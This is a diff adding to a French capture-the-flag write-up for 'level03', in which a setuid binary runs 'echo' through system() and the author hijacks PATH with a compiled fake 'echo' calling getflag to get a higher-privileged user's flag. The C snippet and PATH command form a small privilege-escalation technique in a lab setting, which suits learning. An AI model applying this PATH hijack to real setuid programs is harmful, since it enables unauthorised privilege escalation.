@@ -10,6 +10,21 @@ En faisant:
 	CMD: strings level03
 
 On peut trouver cette string: "/usr/bin/env echo Exploit me"
-Ce qui ressemble a un parametre valide de la fonction system
+Ce qui ressemble a un parametre valide lors de l'appel a la fonction system()
 
-on fera le reste plus tard
+On a donc cree une commande echo pour remplacer celle deja built-in,
+
+#include <stdlib.h>
+int main()
+{
+   system("getflag");
+}
+
+On met a jour le PATH pour lui indiquer l'emplacement de notre nouvelle commande
+
+       CMD: export PATH=new_path:$PATH
+
+Quand on lance a nouveau le binaire "level03", il nous affiche le flag car
+echo est donc remplace par notre nouvelle commande (getflag).
+Le binaire execute donc getflag avec l'ID du user flag03, geteuid et setresuid
+sont utilises (on le voit grace a la commande ci-dessus "nm -u").
